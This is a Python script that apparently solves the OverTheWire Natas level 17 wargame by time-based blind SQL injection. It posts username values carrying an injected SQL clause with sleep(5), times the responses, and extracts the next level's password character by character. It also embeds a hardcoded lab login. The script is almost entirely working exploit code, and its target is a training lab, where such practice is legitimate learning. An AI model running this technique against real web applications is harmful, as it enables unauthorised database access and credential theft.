#!/usr/bin/env
import requests
url = 'http://natas17.natas.labs.overthewire.org'
content = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
s = requests.Session()
s.auth = ('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')

def is_in(data):
    req = s.post(url, data = data)
    return req.elapsed.seconds >= 5

def character():
    char_selected = ''
    for var in content:
        data = {'username': f'natas18" and password like binary "%{var}%" and sleep(5) # '}
        if is_in(data):
            char_selected += var
        print(char_selected)
    return char_selected

def char_sequence(char_selected):
    seq = ''
    for i in range(32):
        for var in char_selected:
            data = {'username': f'natas18" and password like binary "{seq}{var}%" and sleep(5) # '}
            if is_in(data):
                seq += var
            print(seq)
    return seq

char_selected = character()
print("\n\n\nFind correct sequence!!!")
print(char_sequence(char_selected))




